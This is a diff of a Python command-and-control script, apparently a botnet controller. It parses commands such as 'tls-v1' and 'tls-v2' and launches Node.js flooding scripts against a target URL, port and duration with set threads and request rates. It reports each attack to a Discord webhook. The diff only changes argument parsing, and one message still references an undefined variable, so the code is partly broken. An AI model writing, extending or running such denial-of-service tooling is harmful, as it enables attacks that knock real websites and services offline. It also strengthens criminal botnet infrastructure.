@@ -408,10 +408,9 @@ def main():
  
         elif "tls-v1" in cnc:
             try:
-                method = cnc.split()[1]
-                ip = cnc.split()[2]
-                port = cnc.split()[3]
-                time = cnc.split()[4] 
+                url = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
                 device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\ntls\n---------------\nTarget: {url}:{port}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node tls.js {url} {port} {time}')
@@ -423,10 +422,11 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                thread = cnc.split()[3]
+                per = cnc.split()[3]
+                thread = cnc.split()[4]
                 device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nTLS-V2\n---------------\nTarget: {url}\nTime: {time}\nReq_Per_Sec: {req_per_sex}\nThreads: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'node TLS-V2.js {url} {time} {req_per_sec} {thread}')
+                os.system(f'node TLS-V2.js {url} {time} {per} {thread}')
             except IndexError:
                 print('Usage: tls-v2 <url> <time> <req_per_sec> <threads>')
                 print('Example: tls-v2 https://example.com 60 10 1')
